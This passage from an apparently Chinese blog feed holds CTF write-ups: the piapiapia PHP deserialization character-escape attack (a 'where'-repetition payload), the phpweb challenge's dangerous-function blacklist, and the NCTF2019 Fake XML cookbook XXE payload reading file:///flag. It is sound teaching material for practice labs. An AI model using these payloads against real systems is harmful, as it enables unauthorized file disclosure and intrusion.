    <content type="html"><![CDATA[<h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><ul><li><h5 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h5></li><li><h5 id="参数传递数组绕过字符串检测"><a href="#参数传递数组绕过字符串检测" class="headerlink" title="参数传递数组绕过字符串检测"></a>参数传递数组绕过字符串检测</h5></li><li><h5 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h5><h5 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h5><p><a href="https://www.cnblogs.com/g0udan/p/12216207.html">0CTF 2016]piapiapia解题详细思路及复现 - g0udan - 博客园 (cnblogs.com)</a></p></li></ul><h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题<img src="/2021/08/17/buu/12/image-20210817200805927.png" alt="image-20210817200805927"></h4><p>进来是一个登录页面，很难登录，且也不是什么sql注入</p><p>f12无发现</p><p>这时候请出dirsearch(记得调低线程，不然会漏掉<a href="http://www.zip/">www.zip</a>)</p><p><img src="/2021/08/17/buu/12/image-20210817201129087.png" alt="image-20210817201129087"></p><p>通过后台扫描我们有了register页面，也就是注册页面</p><p>还有<a href="http://www.zip,config.php,update.php,这些我们后面都要用到./">www.zip,config.php,update.php,这些我们后面都要用到。</a></p><p><img src="/2021/08/17/buu/12/image-20210817204317100.png" alt="image-20210817204317100"></p><p>注册后登录</p><p><img src="/2021/08/17/buu/12/image-20210817201432160.png" alt="image-20210817201432160"></p><p><img src="/2021/08/17/buu/12/image-20210817201501824.png" alt="image-20210817201501824"></p><p>进入到updat.php,提示我们上传文件，本来我还以为是传图片马</p><p>结果本题核心不是，是前面扫出的<a href="http://www.zip源码提示了绕过/">www.zip源码提示了绕过</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line">require_once(&#39;class.php&#39;);</span><br><span class="line">if ($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;</span><br><span class="line">die(&#39;Login First&#39;);</span><br><span class="line">&#125;</span><br><span class="line">if ($_POST[&#39;phone&#39;] &amp; &amp; $_POST[&#39;email&#39;] &amp; &amp; $_POST[&#39;nickname&#39;] &amp; &amp; $_FILES[&#39;photo&#39;]) &#123;</span><br><span class="line"></span><br><span class="line">$username &#x3D; $_SESSION[&#39;username&#39;];</span><br><span class="line">if (!preg_match(&#39;&#x2F;^\d&#123;11&#125;$&#x2F;&#39;, $_POST[&#39;phone&#39;]))</span><br><span class="line">die(&#39;Invalid phone&#39;);</span><br><span class="line"></span><br><span class="line">if (!preg_match(&#39;&#x2F;^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$&#x2F;&#39;, $_POST[&#39;email&#39;]))</span><br><span class="line">die(&#39;Invalid email&#39;);</span><br><span class="line"></span><br><span class="line">if (preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) | | strlen($_POST[&#39;nickname&#39;]) &gt; 10)</span><br><span class="line">die(&#39;Invalid nickname&#39;);</span><br><span class="line"></span><br><span class="line">$file &#x3D; $_FILES[&#39;photo&#39;];</span><br><span class="line">if ($file[&#39;size&#39;] &lt; 5 or $file[&#39;size&#39;] &gt; 1000000)</span><br><span class="line">die(&#39;Photo size error&#39;);</span><br><span class="line"></span><br><span class="line">move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload&#x2F;&#39;.md5($file[&#39;name&#39;]));</span><br><span class="line">$profile[&#39;phone&#39;] &#x3D; $_POST[&#39;phone&#39;];</span><br><span class="line">$profile[&#39;email&#39;] &#x3D; $_POST[&#39;email&#39;];</span><br><span class="line">$profile[&#39;nickname&#39;] &#x3D; $_POST[&#39;nickname&#39;];</span><br><span class="line">$profile[&#39;photo&#39;] &#x3D; &#39;upload&#x2F;&#39;.md5($file[&#39;name&#39;]);</span><br><span class="line"></span><br><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">echo &#39;Update Profile Success!&lt;a href&#x3D;&quot;profile.php&quot;&gt;Your Profile&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">? &gt;</span><br></pre></td></tr></table></figure><p>代码分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">require_once(&#39;class.php&#39;);</span><br><span class="line">if ($_SESSION[&#39;username&#39;] &#x3D;&#x3D; null) &#123;</span><br><span class="line">die(&#39;Login First&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们已经登录了，非常容易地就满足了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if ($_POST[&#39;phone&#39;] &amp; &amp; $_POST[&#39;email&#39;] &amp; &amp; $_POST[&#39;nickname&#39;] &amp; &amp; $_FILES[&#39;photo&#39;]) &#123;</span><br></pre></td></tr></table></figure><p>几个变量值都为POST传参</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match(&#39;&#x2F;^\d&#123;11&#125;$&#x2F;&#39;, $_POST[&#39;phone&#39;]))</span><br><span class="line">die(&#39;Invalid phone&#39;);</span><br></pre></td></tr></table></figure><p>正则表达式判断是否为11位的数字电话号码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&#39;&#x2F;[^a-zA-Z0-9_]&#x2F;&#39;, $_POST[&#39;nickname&#39;]) | | strlen($_POST[&#39;nickname&#39;]) &gt; 10)</span><br><span class="line">die(&#39;Invalid nickname&#39;);</span><br></pre></td></tr></table></figure><p>这里判断了nickname是否为字符还有长度是否超过10</p><p>用文章开头的知识点二，如果我们传入的nickname是一个数组</p><p>绕过长度的限制，则可以绕过这正则表达式，使得我们不会die出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br></pre></td></tr></table></figure><h5 id="照搬大佬思路："><a href="#照搬大佬思路：" class="headerlink" title=" 照搬大佬思路："></a> 照搬大佬思路：</h5><p>在代码的后面调用update_profile处我们想到这个可能是将数据保存到数据库，而且还用了php序列化serialize()，我们可以大胆的尝试用反序列化漏洞来搞一下。</p><p> 我们再看看update_profile()到底是个啥，使用全局搜索我们在class.php中看到了定义的update_profile()方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public function update_profile($username, $new_profile) &#123;</span><br><span class="line">$username &#x3D; parent::filter($username);</span><br><span class="line">$new_profile &#x3D; parent::filter($new_profile);</span><br><span class="line"></span><br><span class="line">$where &#x3D; &quot;username &#x3D; &#39;$username&#39;&quot;;</span><br><span class="line">return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  我们再继续追寻下去<br>filter()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public function filter($string) &#123;</span><br><span class="line">$escape &#x3D; array(&#39;\&#39;&#39;, &#39;\\\\&#39;);</span><br><span class="line">$escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;;</span><br><span class="line">$string &#x3D; preg_replace($escape, &#39;_&#39;, $string);</span><br><span class="line"></span><br><span class="line">$safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);</span><br><span class="line">$safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;</span><br><span class="line">return preg_replace($safe, &#39;hacker&#39;, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>update()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function update($table, $key, $value, $where) &#123;</span><br><span class="line">$sql &#x3D; &quot;UPDATE $table SET $key &#x3D; &#39;$value&#39; WHERE $where&quot;;</span><br><span class="line">return mysql_query($sql);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  update.php我们基本上就搞清楚了，是先经过正则表达式将用户提交的参数值过滤，然后序列化，然后将非法的值替换为’hacker’</p><h5 id="反序列化字符逃逸知识补充"><a href="#反序列化字符逃逸知识补充" class="headerlink" title="反序列化字符逃逸知识补充"></a>反序列化字符逃逸知识补充</h5><ul><li>PHP反序列化字符逃逸<br>举个小例子<br>序列化</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; array(&#39;123&#39;, &#39;abc&#39;, &#39;defg&#39;);</span><br><span class="line">var_dump(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(49) &quot;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&quot; </span><br></pre></td></tr></table></figure><p>反序列化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;$a &#x3D; array(&#39;123&#39;, &#39;abc&#39;, &#39;defg&#39;);</span><br><span class="line">&#x2F;&#x2F;var_dump(serialize($a));</span><br><span class="line">&#x2F;&#x2F;&quot;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&quot;</span><br><span class="line">$b &#x3D; &#39;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#39;;</span><br><span class="line">var_dump(unserialize($b));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(3) &#123; [0]&#x3D;&gt; string(3) &quot;123&quot; [1]&#x3D;&gt; string(3) &quot;abc&quot; [2]&#x3D;&gt; string(4) &quot;defg&quot; &#125; </span><br></pre></td></tr></table></figure><p>  我们可以看到在后端中，反序列化是一”;}结束的，如果我们把”;}带入需要反序列化的字符串中（除了结尾处），是不是就能让反序列化提前结束后面的内容就丢弃了呢？<br>  我们把第二个值abc换成abc”;i:2;s:5:”qwert”;}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;$a &#x3D; array(&#39;123&#39;, &#39;abc&#39;, &#39;defg&#39;);</span><br><span class="line">&#x2F;&#x2F;var_dump(serialize($a));</span><br><span class="line">&#x2F;&#x2F;&quot;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&quot;</span><br><span class="line">$b &#x3D; &#39;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:5:&quot;qwert&quot;;&#125;&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#39;;</span><br><span class="line">var_dump(unserialize($b));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array(3) &#123; [0]&#x3D;&gt; string(3) &quot;123&quot; [1]&#x3D;&gt; string(3) &quot;abc&quot; [2]&#x3D;&gt; string(5) &quot;qwert&quot; &#125; </span><br></pre></td></tr></table></figure><p>成功的反序列化出我们自己定义的内容，丢弃了原先的内容（i:2;s:4:”defg”）<br>反序列化字符逃逸就先介绍到这里，我们回过头来看一下题</p><ul><li>突破口<br>我们发现一个问题，我们反序列化字符逃逸，首先序列化的字符是可控的，还有前面的长度是可控的。但update.php将参数序列化，我们可控变量的长度就已经写死了，怎么才能去控制呢。这道题的突破口其实就是序列化过后数据过滤替换那里，看似更加安全，其实更加危险。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;过滤函数</span><br><span class="line">public function filter($string) &#123;</span><br><span class="line">$escape &#x3D; array(&#39;\&#39;&#39;, &#39;\\\\&#39;);</span><br><span class="line">$escape &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $escape) . &#39;&#x2F;&#39;;</span><br><span class="line">$string &#x3D; preg_replace($escape, &#39;_&#39;, $string);</span><br><span class="line"></span><br><span class="line">$safe &#x3D; array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);</span><br><span class="line">$safe &#x3D; &#39;&#x2F;&#39; . implode(&#39;|&#39;, $safe) . &#39;&#x2F;i&#39;;</span><br><span class="line">return preg_replace($safe, &#39;hacker&#39;, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  这里是将’select’, ‘insert’, ‘update’, ‘delete’, ‘where’替换成’hacker’，我们写入where替换成hacker之后字符串实际的长度就+1，因此实际的长度大于序列化固定的长度（变量前面‘s’里的值）。利用反序列化字符串逃逸，反序列化时只能将字符串中nickname前面的s后面长度的字符串反序列化成功，这个是传参的时候就固定好了。剩下的字符串我们构造成class.php因为里面包含了flag，并且让他在photo位置上，然后把photo给扔掉，这样在profile.php中读取的photo就是我们构造的config.php了，也就是读取到了flag<br>  简单说就是利用后端的函数替换，导致实际长度增加，增加的部分（config.php）被挤了出来，到了photo的位置上，然后闭合。<br>  再举个例方便大家理解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;$a &#x3D; array(&#39;123&#39;, &#39;abc&#39;, &#39;defg&#39;);</span><br><span class="line">&#x2F;&#x2F;var_dump(serialize($a));</span><br><span class="line">&#x2F;&#x2F;&quot;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&quot;</span><br><span class="line">$a &#x3D; &#39;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#39;;</span><br><span class="line">$b &#x3D; &#39;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:5:&quot;qwert&quot;;&#125;&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#39;;</span><br><span class="line">var_dump(unserialize($b));</span><br><span class="line">var_dump(unserialize($b));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>abc前面的s:3:不变，因为是序列化的时候固定了<br>我们将abc构造成：abc”;i:2;s:5:”qwert”;}我们再最后构造了一个闭合，导致defg被丢弃，qwert占用了defg原本的位置<br>  还是回到这一道题上，我们的目的是将”;}s:5:”photo”;s:10:”config.php”;}插入序列化的字符串里面去，这个的长度为34，所以我们要挤出来34位，不然就成了nickname的值了。where会替换成hacker，长度加1，所以我们要构造34个where。然后去profile.php查看读取的内容。</p><h5 id="解题继续"><a href="#解题继续" class="headerlink" title="解题继续"></a>解题继续</h5><p>nickname传入，并且nickname要改成nickname[]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/17/buu/12/image-20210817203900289.png" alt="image-20210817203900289"></p><p>上传成功，去访问profile.php</p><p><img src="/2021/08/17/buu/12/image-20210817204106098.png" alt="image-20210817204106098"></p><hr><p><img src="/2021/08/17/buu/12/image-20210817204134202.png" alt="image-20210817204134202"></p><p>解码一下</p><p><img src="/2021/08/17/buu/12/image-20210817204228388.png" alt="image-20210817204228388"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x00知识点&quot;&gt;&lt;a href=&quot;#0x00知识点&quot; class=&quot;headerlink&quot; title=&quot;0x00知识点&quot;&gt;&lt;/a&gt;0x00知识点&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;h5 id=&quot;信息泄露&quot;&gt;&lt;a href=&quot;#信息泄露&quot; class=&quot;headerl</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯 2020 朱雀组 phpweb&amp;NCTF2019 Fake XML cookbook</title>
    <link href="http://daweitech.github.io/2021/08/11/buu/11/"/>
    <id>http://daweitech.github.io/2021/08/11/buu/11/</id>
    <published>2021-08-11T11:33:11.000Z</published>
    <updated>2021-08-24T12:27:17.866Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h3><p>XML可能存在的漏洞:<br>XML注入和XPath注入XML 外部实体注入</p><p><strong>什么是 XML？</strong><br>XML 指可扩展标记语言（EXtensible Markup Language）。<br>XML 的设计宗旨是传输数据，而不是显示数据。<br>XML 是 W3C 的推荐标准。<br>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。<br>XML 语言没有预定义的标签</p><p><strong>XXE攻击</strong><br>附上链接：</p><p><a href="https://xz.aliyun.com/t/6887**%E4%BB%8EXML%E7%9B%B8%E5%85%B3%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E5%88%B0XXE%E6%BC%8F%E6%B4%9E">https://xz.aliyun.com/t/6887**从XML相关一步一步到XXE漏洞</a>**</p><p>XXE(XML External Entity Injection)全称为XML外部实体注入</p><p><a href="https://www.freebuf.com/vuls/175451.html">浅谈XML实体注入漏洞 - FreeBuf网络安全行业门户</a><strong>浅谈XML实体注入漏洞</strong></p><h3 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h3><h4 id="网鼎杯-2020-朱雀组"><a href="#网鼎杯-2020-朱雀组" class="headerlink" title="网鼎杯 2020 朱雀组"></a>网鼎杯 2020 朱雀组</h4><p><img src="/2021/08/11/buu/11/image-20210811193932874.png" alt="image-20210811193932874"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    $disable_fun &#x3D; array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">    function gettime($func, $p) &#123;</span><br><span class="line">        $result &#x3D; call_user_func($func, $p);</span><br><span class="line">        $a&#x3D; gettype($result);</span><br><span class="line">        if ($a &#x3D;&#x3D; &quot;string&quot;) &#123;</span><br><span class="line">            return $result;</span><br><span class="line">        &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Test &#123;</span><br><span class="line">        var $p &#x3D; &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">        var $func &#x3D; &quot;date&quot;;</span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">            if ($this-&gt;func !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $func &#x3D; $_REQUEST[&quot;func&quot;];</span><br><span class="line">    $p &#x3D; $_REQUEST[&quot;p&quot;];</span><br><span class="line">    if ($func !&#x3D; null) &#123;</span><br><span class="line">    $func &#x3D; strtolower($func);</span><br><span class="line">    if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">        echo gettime($func, $p);</span><br><span class="line">    &#125;else &#123;</span><br><span class="line">        die(&quot;Hacker...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/11/buu/11/image-20210811194437549.png" alt="image-20210811194437549"></p><h4 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="NCTF2019 Fake XML cookbook"></a>NCTF2019 Fake XML cookbook</h4><p>这题解题挺快的，有点像之前的sql注入</p><p>这次是进行恶意实体注入</p><p><img src="/2021/08/11/buu/11/image-20210812153137919.png" alt="image-20210812153137919"></p><p>尝试admin，抓个包</p><p><img src="/2021/08/11/buu/11/image-20210812153237740.png" alt="image-20210812153237740"></p><p>看到了POST提交数据后的页面</p><p>我们查看无输入数据的页面源代码</p><p>找到关键代码段</p><p><img src="/2021/08/11/buu/11/image-20210812153441742.png" alt="image-20210812153441742"></p><pre><code>function doLogin()&#123;    var username = $(&quot;#username&quot;).val();    var password = $(&quot;#password&quot;).val();    if(username == &quot;&quot; || password == &quot;&quot;)&#123;        alert(&quot;Please enter the username and password!&quot;);        return;    &#125;var data = &quot;&lt;user&gt;&lt;username&gt;&quot; + username + &quot;&lt;/username&gt;&lt;password&gt;&quot; + password + &quot;&lt;/password&gt;&lt;/user&gt;&quot;; $.ajax(&#123;    type: &quot;POST&quot;,    url: &quot;doLogin.php&quot;,    contentType: &quot;application/xml;charset=utf-8&quot;,    data: data,    dataType: &quot;xml&quot;,    anysc: false,    success: function (result) &#123;        var code = result.getElementsByTagName(&quot;code&quot;)[0].childNodes[0].nodeValue;        var msg = result.getElementsByTagName(&quot;msg&quot;)[0].childNodes[0].nodeValue;        if(code == &quot;0&quot;)&#123;            $(&quot;.msg&quot;).text(msg + &quot; login fail!&quot;);        &#125;else if(code == &quot;1&quot;)&#123;            $(&quot;.msg&quot;).text(msg + &quot; login success!&quot;);        &#125;else&#123;            $(&quot;.msg&quot;).text(&quot;error:&quot; + msg);        &#125;    &#125;,    error: function (XMLHttpRequest,textStatus,errorThrown) &#123;        $(&quot;.msg&quot;).text(errorThrown + &#39;:&#39; + textStatus);    &#125;&#125;); &#125;</code></pre><p><strong>摘抄：</strong></p><p><strong>XML可能存在的漏洞：</strong><br>XML注入和XPath注入XML 外部实体注入</p><p><strong>什么是 XML？</strong><br>XML 指可扩展标记语言（EXtensible Markup Language）。<br>XML 的设计宗旨是传输数据，而不是显示数据。<br>XML 是 W3C 的推荐标准。<br>XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。<br>XML 语言没有预定义的标签</p><p><strong>XXE攻击</strong><br>附上链接：</p><p><a href="https://xz.aliyun.com/t/6887">https://xz.aliyun.com/t/6887</a></p><p>XXE(XML External Entity Injection)全称为XML外部实体注入</p><p>Payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ENTITY admin SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;admin;&lt;&#x2F;username&gt;&lt;password&gt;123456&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/11/buu/11/image-20210812154303323.png" alt="image-20210812154303323"></p><h6 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h6><p> <a href="https://blog.csdn.net/devilare/article/details/118969558">NCTF2019]Fake XML cookbook_devilare的博客-CSDN博客</a></p><p> <a href="https://blog.csdn.net/SopRomeo/article/details/105913611">NCTF2019]Fake XML cookbook_SopRomeo的博客-CSDN博客</a></p><p>[<a href="https://www.cnblogs.com/wangtanzhi/p/12323562.html">NCTF2019]Fake XML cookbook - 王叹之 - 博客园 (cnblogs.com)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0x00知识点&quot;&gt;&lt;a href=&quot;#0x00知识点&quot; class=&quot;headerlink&quot; title=&quot;0x00知识点&quot;&gt;&lt;/a&gt;0x00知识点&lt;/h3&gt;&lt;p&gt;XML可能存在的漏洞:&lt;br&gt;XML注入和XPath注入XML 外部实体注入&lt;/p&gt;
&lt;p&gt;&lt;str</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>安洵杯 2019 easy_web</title>
    <link href="http://daweitech.github.io/2021/08/08/buu/10/"/>
    <id>http://daweitech.github.io/2021/08/08/buu/10/</id>
    <published>2021-08-08T13:33:02.000Z</published>
    <updated>2021-08-24T13:41:24.259Z</updated>
    
